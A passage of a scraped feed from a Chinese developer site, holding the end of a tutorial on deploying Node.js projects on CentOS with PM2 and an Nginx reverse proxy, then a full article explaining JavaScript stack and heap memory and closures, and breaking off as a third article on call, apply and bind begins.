<p>返回结果如下所示，表示当前已安装v22.11.0、v23.3.0两个版本，正在使用的是v22.11.0版本。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aacdb173fbed4c8e91f05968f5ae559e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X5ri4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765941591&amp;x-signature=RyWJBJdxFeiJaa6LgKO2eSR27tA%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p><strong>切换版本</strong></p>
<p>您可以使用nvm use &lt;版本号&gt;命令切换Node.js的版本。
例如，切换至Node.js v23.3.0版本的命令为nvm use v23.3.0。</p>
</li>
</ol>
<h3 data-id="heading-5">2.  安装PM2（进程管理）</h3>
<pre><code class="hljs language-bash" lang="bash">sudo npm install -g pm2
</code></pre>
<h3 data-id="heading-6">3.  安装Nginx（反向代理）</h3>
<pre><code class="hljs language-bash" lang="bash">sudo yum install -y nginx

<span class="hljs-comment"># 启动Nginx</span>
sudo systemctl start nginx
sudo systemctl <span class="hljs-built_in">enable</span> nginx <span class="hljs-comment">#开机自动启动</span>
</code></pre>
<h2 data-id="heading-7">三、部署Node.js项目</h2>
<p>假设有两个项目：</p>
<ul>
<li>项目1：端口3000，子域名api1.example.com</li>
<li>项目2：端口4000，子域名api2.example.com</li>
</ul>
<h3 data-id="heading-8">1.  上传项目代码</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建项目目录</span>
<span class="hljs-built_in">mkdir</span> -p /var/www/api1 /var/www/api2

<span class="hljs-comment"># 上传代码（使用git）</span>

<span class="hljs-built_in">cd</span> /var/www/api1
git <span class="hljs-built_in">clone</span> your-repo-url
npm install

<span class="hljs-built_in">cd</span> /var/www/api2
git <span class="hljs-built_in">clone</span> your-second-repo-url
npm install
</code></pre>
<h3 data-id="heading-9">2.  使用PM2启动项目</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 启动项目1</span>
<span class="hljs-built_in">cd</span> /var/www/api1
pm2 start app.js --name <span class="hljs-string">"api1"</span> -i max --watch

<span class="hljs-comment"># 启动项目2</span>
<span class="hljs-built_in">cd</span> /var/www/api2
pm2 start app.js --name <span class="hljs-string">"api2"</span> -i max --watch

<span class="hljs-comment"># 保存PM2配置</span>
pm2 save

<span class="hljs-comment"># 设置PM2开机启动</span>
pm2 startup
<span class="hljs-comment"># 执行输出的命令（会显示类似下面的命令）</span>
<span class="hljs-comment"># sudo env PATH=$PATH:/usr/bin /usr/lib/node_modules/pm2/bin/pm2 startup centos -u root --hp /root</span>
</code></pre>
<h2 data-id="heading-10">四、配置子域名和Nginx反向代理</h2>
<h3 data-id="heading-11">1. 域名解析准备</h3>
<p>在阿里云DNS解析控制台添加子域名解析：</p>
<ul>
<li>api1.example.com → 服务器IP</li>
<li>api2.example.com → 服务器IP</li>
</ul>
<h3 data-id="heading-12">2. 配置Nginx反向代理</h3>
<p><strong>为项目1创建配置 (api1.example.com)</strong></p>
<pre><code class="hljs language-nginx" lang="nginx">server {
    listen 80;
    server_name api1.example.com;

    location / {
        proxy_pass http://localhost:3000;  # 假设项目1运行在3000端口
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
</code></pre>
<p><strong>为项目2创建配置 (api2.example.com)</strong></p>
<pre><code class="hljs language-nginx" lang="nginx">server {
    listen 80;
    server_name api2.example.com;

    location / {
        proxy_pass http://localhost:4000;  # 假设项目2运行在4000端口
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
</code></pre>
<h3 data-id="heading-13">3. 测试并重启Nginx</h3>
<pre><code class="hljs language-bash" lang="bash">nginx -t
systemctl restart nginx
</code></pre>
<h2 data-id="heading-14">五、维护与监控</h2>
<h3 data-id="heading-15">1. PM2常用命令</h3>
<pre><code class="hljs language-bash" lang="bash">pm2 list          <span class="hljs-comment"># 查看所有应用</span>
pm2 restart api1  <span class="hljs-comment"># 重启特定应用</span>
pm2 stop api2     <span class="hljs-comment"># 停止应用</span>
pm2 delete api1   <span class="hljs-comment"># 删除应用</span>
</code></pre>
<h3 data-id="heading-16">2. Nginx常用命令</h3>
<pre><code class="hljs language-bash" lang="bash">systemctl restart nginx  <span class="hljs-comment"># 重启Nginx</span>
nginx -t                <span class="hljs-comment"># 测试配置</span>
journalctl -u nginx     <span class="hljs-comment"># 查看Nginx系统日志</span>
</code></pre>
<h3 data-id="heading-17">3. 查看服务器资源</h3>
<pre><code class="hljs language-bash" lang="bash">top
htop
<span class="hljs-built_in">df</span> -h
free -m
</code></pre>
<p>通过以上步骤，你可以在CentOS 7.9服务器上部署多个Node.js项目，并通过不同的子域名访问它们。每个项目都运行在独立的端口上，通过Nginx反向代理和PM2进程管理实现稳定运行。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript 内存机制与闭包：从栈到堆的深入浅出]]></title>    <link>https://juejin.cn/post/7581870491763064884</link>    <guid>https://juejin.cn/post/7581870491763064884</guid>    <pubDate>2025-12-10T03:35:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491763064884" data-draft-id="7581870491762917428" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 内存机制与闭包：从栈到堆的深入浅出"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-10T03:35:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ohyeah"/> <meta itemprop="url" content="https://juejin.cn/user/740446536480618"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 内存机制与闭包：从栈到堆的深入浅出
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/740446536480618/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ohyeah
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:35:39.000Z" title="Wed Dec 10 2025 03:35:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在前端开发中，JavaScript 是我们最常用的编程语言之一。然而，很多人在学习 JS 的过程中，常常忽略了它背后运行的底层机制——<strong>内存管理</strong>。今天我们就结合几段代码和图示，来聊聊 JavaScript 中最重要的两个概念：<strong>内存机制</strong> 和 <strong>闭包</strong>。</p>
<hr/>
<h2 data-id="heading-0">一、JS 的执行环境：三大内存空间</h2>
<p>在 JavaScript 执行过程中，程序会使用三种主要的内存空间：</p>
<ol>
<li><strong>代码空间</strong></li>
<li><strong>栈内存（Stack）</strong></li>
<li><strong>堆内存（Heap）</strong></li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4aa8ff5bca0436ba3f9f8e83b989b96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgb2h5ZWFo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942539&amp;x-signature=c8Eq03NGEktFcYBIfbXqJUqgcI8%3D" alt="lQLPJxDjlfllrWfNBJ_NBHawALUXmftxe5cJEmLLH90MAA_1142_1183.png" loading="lazy"/></p>
<blockquote>
<p>图1：JavaScript 的三大内存空间</p>
</blockquote>
<h3 data-id="heading-1">1. 代码空间</h3>
<p>这是存放源代码的地方。当浏览器加载 HTML 文件时，会把 <code>&lt;script&gt;</code> 标签中的代码从硬盘读取到内存中，形成“代码空间”。这部分内容不会直接参与运行，而是供引擎解析和编译用。</p>
<h3 data-id="heading-2">2. 栈内存</h3>
<p>栈内存是 JS 执行的主角，用于维护函数调用过程中的<strong>执行上下文</strong>。它的特点是：</p>
<ul>
<li>空间小、速度快</li>
<li>连续存储，便于快速切换</li>
<li>每次函数调用都会创建一个执行上下文并压入栈顶</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">function foo() {
  var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  var <span class="hljs-attr">b</span> = a<span class="hljs-comment">;</span>
  <span class="hljs-attr">a</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
  console.log(a)<span class="hljs-comment">; // 2</span>
  console.log(b)<span class="hljs-comment">; // 1</span>
}
foo()<span class="hljs-comment">;</span>
</code></pre>
<p>这段代码执行时，<code>foo()</code> 被调用，会生成一个新的执行上下文，并压入调用栈。这个上下文包含变量 <code>a</code> 和 <code>b</code>，它们都是简单数据类型，直接存储在栈中。</p>
<h3 data-id="heading-3">3. 堆内存</h3>
<p>堆内存用来存储复杂数据类型，比如对象、数组等。这些数据体积大、结构复杂，并且是<strong>动态</strong>的，不能放在栈里，所以被分配到堆中。
它的特点是:</p>
<ul>
<li>'辅助栈内存'</li>
<li>空间大 不连续</li>
<li>存储复杂数据类型 对象</li>
</ul>

<pre><code class="hljs language-css" lang="css">function foo() {
  <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> = { name: <span class="hljs-string">'极客时间'</span> };
  <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span>; // 引用拷贝
  <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.name</span> = '极客邦';
  console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">a</span>); // {name: <span class="hljs-string">"极客邦"</span>}
  console<span class="hljs-selector-class">.log</span>(<span class="hljs-selector-tag">b</span>); // {name: <span class="hljs-string">"极客邦"</span>}
}
foo();
</code></pre>
<p>这里 <code>a</code> 是一个对象，它实际存储在堆内存中，而 <code>a</code> 变量只是保存了该对象的<strong>地址</strong>（引用）。<code>b = a</code> 并不是复制对象，而是让 <code>b</code> 也指向同一个地址。因此修改 <code>a.name</code> 后，<code>b</code> 也能看到变化。</p>
<h3 data-id="heading-4">为什么堆内存是不连续的?</h3>
<ul>
<li>因为对象是动态的 可以去给它添加属性或方法 如果是连续的情况下 显然就不好进行操作了</li>
</ul>
<hr/>
<h2 data-id="heading-5">二、简单 vs 复杂 数据类型：存储方式不同</h2>
<p>JavaScript 有八种原始数据类型：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-literal">undefined</span>, <span class="hljs-literal">null</span>, <span class="hljs-built_in">boolean</span>, <span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>, <span class="hljs-built_in">symbol</span>, <span class="hljs-built_in">bigint</span>, <span class="hljs-built_in">object</span>
</code></pre>
<p>其中前七种是<strong>简单数据类型</strong>，最后一个是<strong>复杂数据类型</strong>。</p>

















<table><thead><tr><th>类型</th><th>存储位置</th></tr></thead><tbody><tr><td>简单类型（如 number, string）</td><td>栈内存</td></tr><tr><td>复杂类型（如 object, array）</td><td>堆内存</td></tr></tbody></table>
<h3 data-id="heading-6">示例说明</h3>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">a</span> = <span class="hljs-string">'极客时间'</span><span class="hljs-comment">; // 字符串 → 栈内存</span>
var <span class="hljs-attr">b</span> = a<span class="hljs-comment">;         // 拷贝值 → b 也是 '极客时间'</span>
<span class="hljs-attr">a</span> = <span class="hljs-string">'极客邦'</span><span class="hljs-comment">;      // 修改 a 不影响 b</span>
console.log(a)<span class="hljs-comment">; // 极客邦</span>
console.log(b)<span class="hljs-comment">; // 极客时间</span>
</code></pre>

<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">c</span> = { name: <span class="hljs-string">'极客时间'</span> }<span class="hljs-comment">; // 对象 → 堆内存</span>
var <span class="hljs-attr">d</span> = c<span class="hljs-comment">;                  // 引用拷贝 → d 指向同一地址</span>
<span class="hljs-attr">c.name</span> = <span class="hljs-string">'极客邦'</span><span class="hljs-comment">;          // 修改共享对象</span>
console.log(c.name)<span class="hljs-comment">; // 极客邦</span>
console.log(d.name)<span class="hljs-comment">; // 极客邦</span>
</code></pre>
<blockquote>
<p>✅ 结论：</p>
<ul>
<li>简单类型是“值传递”，每个变量独立存在</li>
<li>复杂类型是“引用传递”，多个变量可能指向同一块堆内存</li>
</ul>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6f7e375eb654499a97beeb426b4a68f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgb2h5ZWFo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942539&amp;x-signature=kqCgSDiSKERtKdX%2BLWZvkWcFWWI%3D" alt="lQLPJxNqPKGZwofNAifNBHawc4pej93FtxkJEmmk8M9qAA_1142_551.png" loading="lazy"/></p>
<blockquote>
<p>图2：变量 <code>c</code> 存储的是堆内存中对象的地址（1003）</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">三、执行上下文与调用栈</h2>
<p>JavaScript 的执行流程依赖于<strong>调用栈</strong>（Call Stack），它是函数调用的“记录本”。</p>
<p>每当一个函数被执行，就会创建一个<strong>执行上下文</strong>（Execution Context），包括：</p>
<ul>
<li>变量环境（Variable Environment）</li>
<li>词法环境（Lexical Environment）</li>
<li>outer（外层作用域链）</li>
</ul>
<p>执行上下文会被压入调用栈顶部。当函数执行完毕后，该上下文就会被弹出并回收。</p>
<h3 data-id="heading-8">示例：函数调用前后</h3>
<pre><code class="hljs language-ini" lang="ini">function foo() {
  var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  var <span class="hljs-attr">b</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
}

foo()<span class="hljs-comment">; // 调用 foo</span>
</code></pre>
<p>执行过程如下：</p>
<ol>
<li>创建全局执行上下文（已存在）</li>
<li>调用 <code>foo()</code>，创建新的执行上下文，压入调用栈</li>
<li>执行完 <code>foo()</code>，将其执行上下文弹出，指针回到全局上下文</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78eb34e7e6094e3697a8b1553b6e9150~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgb2h5ZWFo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942539&amp;x-signature=6BHV7cDi%2B0wgwPaNqiLJM2oJcSE%3D" alt="lQLPJw1WF0yif-fNAhTNBHawwsioxubOAzAJEmTtM6BTAA_1142_532.png" loading="lazy"/></p>
<blockquote>
<p>图3：<code>foo()</code> 执行前后调用栈的变化</p>
</blockquote>
<p>注意：<strong>栈顶指针移动非常快</strong>，因为栈是连续内存，只需要改变指针位置即可完成上下文切换(栈顶指针的切换通过一个机制，做内存的减法)。如果将复杂对象也放在栈中，会导致栈空间过大、不连续，严重影响性能。</p>
<hr/>
<h2 data-id="heading-9">四、动态弱类型语言：JS 的灵活性</h2>
<p>JavaScript 是一种<strong>动态弱类型语言</strong>，这意味着：</p>
<ul>
<li><strong>动态</strong>：变量可以在运行时改变类型</li>
<li><strong>弱类型</strong>：不同类型之间可以自动转换</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">var bar<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // undefined</span>

<span class="hljs-attr">bar</span> = <span class="hljs-number">12</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // number</span>

<span class="hljs-attr">bar</span> = <span class="hljs-string">'极客时间'</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // string</span>

<span class="hljs-attr">bar</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // boolean</span>

<span class="hljs-attr">bar</span> = null<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // object（JS 设计缺陷）</span>

<span class="hljs-attr">bar</span> = { name: <span class="hljs-string">'极客时间'</span> }<span class="hljs-comment">;</span>
console.log(typeof bar)<span class="hljs-comment">; // object</span>
</code></pre>
<p>这正是 JS 的魅力所在：无需提前声明类型，灵活自由。但这也带来了潜在问题，比如 <code>typeof null === 'object'</code> 就是一个经典 bug。</p>
<hr/>
<h2 data-id="heading-10">五、闭包的本质：延长变量生命周期</h2>
<p>现在我们来看一个关键概念——<strong>闭包</strong>。</p>
<h3 data-id="heading-11">什么是闭包？</h3>
<p>闭包是指：<strong>内部函数能够访问外部函数的变量</strong>，即使外部函数已经执行完毕。</p>
<pre><code class="hljs language-ini" lang="ini">&lt;script&gt;
function foo() {
  var <span class="hljs-attr">myName</span> = <span class="hljs-string">"极客时间"</span><span class="hljs-comment">;</span>
  let <span class="hljs-attr">test1</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  const <span class="hljs-attr">test2</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>

  var <span class="hljs-attr">innerBar</span> = {
    setName: function (newName) {
      <span class="hljs-attr">myName</span> = newName<span class="hljs-comment">;</span>
    },
    getName: function () {
      console.log(test1)<span class="hljs-comment">;</span>
      return myName<span class="hljs-comment">;</span>
    }
  }<span class="hljs-comment">;</span>

  return innerBar<span class="hljs-comment">;</span>
}

var <span class="hljs-attr">bar</span> = foo()<span class="hljs-comment">;</span>
bar.setName("极客邦")<span class="hljs-comment">;</span>
bar.getName()<span class="hljs-comment">; // 输出：1, 极客邦</span>
&lt;/script&gt;
</code></pre>
<p>在这个例子中，<code>innerBar</code> 返回了一个对象，其方法 <code>setName</code> 和 <code>getName</code> 都能访问 <code>myName</code> 和 <code>test1</code>。但 <code>foo()</code> 已经执行完了，按理说这些变量应该被销毁了，为什么还能访问？</p>
<p>这就是<strong>闭包</strong>的作用！</p>
<hr/>
<h2 data-id="heading-12">六、闭包背后的内存机制</h2>
<p>闭包是如何工作的？答案就在<strong>堆内存</strong>中。</p>
<h3 data-id="heading-13">步骤解析：</h3>
<ol>
<li>当 <code>foo()</code> 被调用时，V8 引擎会扫描内部函数 <code>setName</code> 和 <code>getName</code></li>
<li>发现这两个函数引用了外部变量 <code>myName</code> 和 <code>test1</code></li>
<li>引擎判断：这是一个闭包！需要保留这些变量</li>
<li>在<strong>堆内存</strong>中创建一个特殊的对象：<code>closure(foo)</code></li>
<li>把 <code>myName</code> 和 <code>test1</code> 的值保存到这个对象中</li>
<li>将 <code>closure(foo)</code> 的地址存入栈中（作为 <code>innerBar</code> 的一部分）</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4133aef40636482a83b6dc09b9d2fe69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgb2h5ZWFo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765942539&amp;x-signature=bP9RGYy1EHtgKgfS7b3xvF8Lup0%3D" alt="lQLPJxNqPKGZwofNAifNBHawc4pej93FtxkJEmmk8M9qAA_1142_551.png" loading="lazy"/></p>
<blockquote>
<p>图4：闭包 <code>closure(foo)</code> 存储在堆内存中，栈中只保存地址</p>
</blockquote>
<h3 data-id="heading-14">关键点总结：</h3>
<ul>
<li><strong>闭包本质</strong>：通过堆内存延长了外部变量的生命周期</li>
<li><strong>栈中保存的是地址</strong>，堆中保存的是真实数据</li>
<li><strong>执行上下文出栈 ≠ 变量消失</strong>，只要还有引用，就继续存活</li>
</ul>
<hr/>
<h2 data-id="heading-15">七、为什么 JS 不需要手动管理内存？</h2>
<p>像 C/C++ 这样的语言，开发者必须使用 <code>malloc</code> 和 <code>free</code> 来手动分配和释放内存：</p>
<pre><code class="hljs language-ini" lang="ini">int main(){
  int <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  char* <span class="hljs-attr">b</span> = <span class="hljs-string">'极客时间'</span><span class="hljs-comment">;</span>
  bool <span class="hljs-attr">c</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>

  <span class="hljs-attr">c</span> = a<span class="hljs-comment">;</span>
  return 0<span class="hljs-comment">;</span>
}
</code></pre>
<p>而在 JavaScript 中，你完全不需要关心这些。<strong>V8 引擎自动完成内存分配和垃圾回收</strong>。</p>
<ul>
<li>栈内存：执行上下文结束 → 自动弹出 → 快速回收</li>
<li>堆内存：没有变量引用的对象 → 垃圾回收器（GC）定期清理</li>
</ul>
<blockquote>
<p>✅ 所以 JS 开发者可以专注于业务逻辑，而不必担心内存泄漏（虽然也要注意，比如事件监听器未解绑可能导致内存泄漏）</p>
</blockquote>
<hr/>
<h2 data-id="heading-16">八、总结：JS 内存机制核心要点</h2>

































<table><thead><tr><th>内容</th><th>说明</th></tr></thead><tbody><tr><td><strong>栈内存</strong></td><td>调用栈在其内部，存放执行上下文、简单数据类型，速度快，连续</td></tr><tr><td><strong>堆内存</strong></td><td>存放复杂对象，空间大，不连续</td></tr><tr><td><strong>变量提升</strong></td><td>编译阶段为变量预留空间，初始值为 <code>undefined</code></td></tr><tr><td><strong>引用传递</strong></td><td>对象赋值是地址拷贝，多个变量共享同一对象</td></tr><tr><td><strong>闭包</strong></td><td>内部函数引用外部变量 → 堆内存保存自由变量 → 延长生命周期</td></tr><tr><td><strong>栈顶指针</strong></td><td>函数调用时移动，上下文切换高效</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-17">九、写在最后</h2>
<p>理解 JavaScript 的内存机制，不仅能帮助我们写出更高效的代码，还能更好地掌握闭包、作用域、垃圾回收等高级概念。虽然我们不需要像 C++ 那样手动操作内存，但了解背后的原理，会让你的代码更加稳健。</p>
<blockquote>
<p>💡 提醒：不要滥用闭包，因为它会让变量长期驻留内存，增加 GC 压力。合理使用，才是高手之道。</p>
</blockquote>
<hr/>
<p>📌 如果你觉得这篇文章对你有帮助，欢迎点赞、收藏、转发！关注我，带你深入浅出地学透前端技术！</p>
<blockquote>
<p>📸 图片来源：本文所有图片均为原创示意图，用于辅助理解 JS 内存模型。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript call、apply、bind 方法解析]]></title>    <link>https://juejin.cn/post/7581844141668057128</link>    <guid>https://juejin.cn/post/7581844141668057128</guid>    <pubDate>2025-12-10T03:42:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581844141668057128" data-draft-id="7581870491763114036" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript call、apply、bind 方法解析"/> <meta itemprop="keywords" content="JavaScript,前端,面试"/> <meta itemprop="datePublished" content="2025-12-10T03:42:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我叫黑大帅"/> <meta itemprop="url" content="https://juejin.cn/user/1678295463898875"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" 